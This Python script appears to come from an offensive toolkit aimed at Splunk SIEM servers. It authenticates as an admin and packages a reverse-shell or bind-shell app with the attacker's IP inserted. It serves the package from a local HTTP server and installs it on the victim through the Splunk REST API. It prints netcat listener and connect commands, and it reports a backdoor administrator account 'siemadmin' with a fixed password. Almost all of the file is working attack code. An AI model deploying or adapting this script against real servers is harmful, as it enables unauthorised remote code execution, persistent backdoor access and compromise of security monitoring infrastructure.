#!/usr/bin/env python3

# Install Reverse Shell or Bind Shell from App

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import getpass
import globals
import os
import sys
import tarfile
import threading
import splunklib.binding as binding
from colorama import Fore, Style
from xml.etree import ElementTree
from http.server import SimpleHTTPRequestHandler
from http.server import HTTPServer

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

# %%%%%%%%%%% Constants %%%%%%%%%%%#

SEPARATOR = "[*] {0} [*]".format('=' * 110)

# %%%%%%%%%%% Functions %%%%%%%%%%%#


def install_app(ip, port, appname):
	splunk_username = input("[!] Enter Splunk Admin (Default admin): ")
	splunk_password = getpass.getpass("[!] Enter Password: ")
	local_ip = input("[!] Enter your local IP address: ")

	context = binding.connect(
		host=ip,
		port=port,
		username=splunk_username,
		password=splunk_password)

	response = context.get('apps/local')
	if response.status != 200:
		raise Exception("%d (%s)" % (response.status, response.reason))

	body = response.body.read()
	data = ElementTree.XML(body)
	apps = data.findall(
		"{http://www.w3.org/2005/Atom}entry/{http://www.w3.org/2005/Atom}title")

	globals.splunk_messages(1)

	for app in apps:
		print("[*] " + app.text)
	print(SEPARATOR)

	basedir = os.path.dirname(os.path.abspath(__file__))
	if appname == "rshell.tar.gz":  # linux python reverse shell
		relpath = 'rshell/bin/reverse_shell.py'

		with open(
				os.path.join(basedir, 'reverse_shell_original.py')) as f:
			# replace the attacker ip
			new_text = f.read().replace('REPLACEME', str(local_ip))
		with open(os.path.join(basedir, relpath), "w+") as f:
			f.write(new_text)
		with tarfile.open(os.path.join(basedir, 'rshell.tar.gz'), "w:gz") as tar:
			tar.add(os.path.join(basedir, 'rshell'), arcname='rshell')

	if appname == "wrshell.tar.gz":  # windows python reverse shell
		relpath = 'wrshell/bin/reverse_shell_win.py'

		with open(os.path.join(basedir, 'reverse_shell_win_original.py')) as f:
			new_text = f.read().replace('REPLACEME', str(local_ip))
		with open(os.path.join(basedir, relpath), "w+") as f:
			f.write(new_text)
		with tarfile.open(os.path.join(basedir, 'wrshell.tar.gz'), "w:gz") as tar:
			tar.add(os.path.join(basedir, 'wrshell'), arcname='wrshell')

	os.chdir(basedir)
	port = 9337
	server = HTTPServer(('', port), SimpleHTTPRequestHandler)
	thread = threading.Thread(target=server.serve_forever)
	thread.daemon = True
	try:
		thread.start()
	except KeyboardInterrupt:
		server.shutdown()
		sys.exit(0)

	if appname != "None":

		apptgz = 'http://' + local_ip + ':' + str(port) + '/' + appname
		response2 = context.post('apps/local', filename='true', name=apptgz)
		if response2.status != 201:  # 201 is the success code
			raise Exception("%d (%s)" % (response2.status, response2.reason))

		body2 = response2.body.read()
		data2 = ElementTree.XML(body2)
		results = data2.findall(
			"{http://www.w3.org/2005/Atom}entry/{http://www.w3.org/2005/Atom}title")

		for result in results:
			globals.splunk_messages(2, result.text)
			server.shutdown()

			if ("rshell.tar.gz" or "wrshell.tar.gz") == appname:  # reverse shells
				print(
					Fore.RED + Style.BRIGHT +
					"[!] Please start a listener on the attacker host "
					"port 12345, for example: nc -lvp 12345")
			if ("bshell.tar.gz" or "wbshell.tar.gz" or "wbshellexe.tar.gz") == appname:
				# bind shells
				print(
					Fore.RED + Style.BRIGHT +
					"[!] Please connect to the victim host on port "
					"12346, for example: nc -v " + ip + " 12346")
			if appname == "wadduser.tar.gz":  # windows adduser
				print(
					Fore.RED + Style.BRIGHT +
					"[!] Administrator user added on the victim host " +
					ip + ", user: siemadmin with password: siemadmin123$")
			print(SEPARATOR)

	else:
		globals.splunk_messages(3)

# %%%%%%%%%% The End %%%%%%%%%%#
